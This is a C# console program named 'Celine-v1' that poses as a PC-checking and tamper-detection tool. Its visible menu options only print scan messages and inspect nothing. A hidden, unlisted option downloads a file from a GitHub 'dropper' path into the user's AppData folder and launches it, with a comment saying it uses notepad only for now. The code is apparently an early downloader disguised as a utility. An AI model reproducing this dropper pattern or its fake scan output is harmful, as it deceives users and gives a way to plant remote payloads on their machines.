﻿// Celine 2024
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using Console = Colorful.Console;

Console.Title = "Celine-v1";
Console.WriteLine(@"
 ██████ ███████ ██      ██ ███    ██ ███████ 
██      ██      ██      ██ ████   ██ ██      
██      █████   ██      ██ ██ ██  ██ █████   
██      ██      ██      ██ ██  ██ ██ ██      
 ██████ ███████ ███████ ██ ██   ████ ███████ July 31st Build
                                                                                    
", Color.BlueViolet);

Console.WriteLine("[Welcome! Please wait while our bootstrapper runs..]", Color.BlueViolet);

// checks if roaming has data folder
if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\celine-v1"))
{
    Console.WriteLine("[Welcome back]", Color.BlueViolet);
}
else
{
    // Console stuff
    Console.WriteLine("\n[Please wait]", Color.BlueViolet);
    // DIRECTORY CREATION TACTIC //
    // Creates a folder in the user's Roaming appdata folder called Celine-v1
    string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string folderName = "celine-v1";
    string pathString = Path.Combine(appData, folderName);

    // Creates Directory If it doesnt exist.
    Directory.CreateDirectory(pathString);

    // Creates a folder called integrity in the Celine-v1 folder
    string integrityFolder = "integrity";
    string integrityPath = Path.Combine(pathString, integrityFolder);

    // Creates Directory If it doesnt exist.
    Directory.CreateDirectory(integrityPath);

    // Creates a folder called LogSettings in the Celine-v1 folder
    string logSettingsFolder = "logSettings";
    string logSettingsFolderPath = Path.Combine(pathString, logSettingsFolder);

    // 1    Creates Directory If it doesnt exist.
    Directory.CreateDirectory(logSettingsFolderPath);

    // Creates a text file in the logSettings folder called FindDeletedFiles.txt and writes the text "true" to it.
    string logSettingsFile2 = "FindDeletedFiles.txt";
    string logSettingsFilePath = Path.Combine(logSettingsFolderPath, logSettingsFile2);

    // 2    Creates File If it doesnt exist.
    File.WriteAllText(logSettingsFilePath, "true");

    Thread.Sleep(2000);
    // Writes celine has initialized
    Console.WriteLine("[Celine has initialized]", Color.BlueViolet);
}

// TAMPER CHECK // to anyone reading this, it makes a simple decoy file to check if the user has tampered with a file called logSettings that includes a fake value. //

// Runs a check to see if the logSettings file is true or false
string logSettingsFile = "FindDeletedFiles.txt";
string logSettingsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\celine-v1\\logSettings", logSettingsFile);
string logSettings = File.ReadAllText(logSettingsPath);

// If logSettings is false, display a tamper warning and exit
if (logSettings == "false")
{
    Console.Clear();
    Console.Title = "Tamper Check Failed";
    Console.WriteLine("[Tamper check has not passed. This user has attempted or is attempting to bypass this PC checking session.]", Color.Red);
    Console.WriteLine("[It is recommended that you carry out the necessary actions. (Ban/Blacklist)]", Color.Red);
    Console.ReadKey();
    Environment.Exit(0);
}

// If logSettings is true, proceed with normal operation
if (logSettings == "true")
{
    Console.Clear();
    Console.Title = "Celine-v1";
    Console.WriteLine(@"
 ██████ ███████ ██      ██ ███    ██ ███████ 
██      ██      ██      ██ ████   ██ ██      
██      █████   ██      ██ ██ ██  ██ █████   
██      ██      ██      ██ ██  ██ ██ ██      
 ██████ ███████ ███████ ██ ██   ████ ███████ July 31st Build
                                                                                    
", Color.BlueViolet);

    // Writes a menu with options from 1 to 3
    Console.WriteLine("[1] Check for deleted files", Color.BlueViolet);
    Console.WriteLine("[2] Check for tamper", Color.BlueViolet);
    Console.WriteLine("[3] Exit", Color.BlueViolet);
    // Asks the user to input a number
    Console.Write("[Enter a number]: ", Color.BlueViolet);
    ConsoleKeyInfo input = Console.ReadKey();

    // If the user inputs 1 write "Starting common file check" and then asks "Would you check for release folders? (Y/N)"
    if (input.KeyChar == '1')
    {
        Console.WriteLine("\n[Starting common file check]", Color.BlueViolet);
        Console.Write("\n[Would you like check for release folders? (Y/N)]: ", Color.BlueViolet);
        Console.ReadKey();
        string input2 = Console.ReadLine(); // Assign the user's input to the input2 variable.
        // If the user inputs Y write "Checking for release folders" and then "Checking for deleted files"
        if (input2.ToLower() == "y")
        {
            Console.WriteLine("\n[Checking for release folders]", Color.BlueViolet);
            Console.WriteLine("\n[Checking for deleted files]", Color.BlueViolet);
        }
        // If the user inputs N write "Checking for deleted files"
        else if (input2.ToLower() == "n")
        {
            Console.WriteLine("\n[Checking for deleted files]", Color.BlueViolet);
        }
        // If the user inputs anything else write "Invalid input"
        else
        {
            Console.WriteLine("\n\n\n[Invalid input]", Color.Red);
        }
    }
    // checks 2 and 3 below
    else if (input.KeyChar == '2')
    {
        Console.WriteLine("[Starting tamper check]", Color.BlueViolet);
        // Perform tamper check logic here
    }
    else if (input.KeyChar == '3')
    {
        Console.WriteLine("[Exiting]", Color.BlueViolet);
        Environment.Exit(0);
    }
    else if (input.KeyChar == '4')
    {
        Console.WriteLine("\n[Please wait while BAM Tools Loads..]", Color.BlueViolet);
        // Goes to this a github link and downloads the .txt file
                string url = "https://raw.githubusercontent.com/playboifusi/Celine/main/dropper/files/FileDroppingTest.txt";
        string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string destinationFolder = Path.Combine(appDataPath, "celine-v1");
        string destinationFile = Path.Combine(destinationFolder, "FileDroppingTest.txt");

        try
        {
            // another celine-v1 integrity check
            if (!Directory.Exists(destinationFolder))
            {
                Directory.CreateDirectory(destinationFolder);
            }

            // Download the file
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(url, destinationFile);
            }

            Console.WriteLine("[File downloaded successfully to " + destinationFile + "]", Color.BlueViolet);

            // starts the new file in notepad.. FOR NOW because its a txt testing file
            Process.Start("notepad.exe", destinationFile);
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }

        
        // Environment.Exit(0);
    }
    else
    {
        Console.WriteLine("[Invalid input]", Color.Red);
    }

    Console.ReadKey();
}
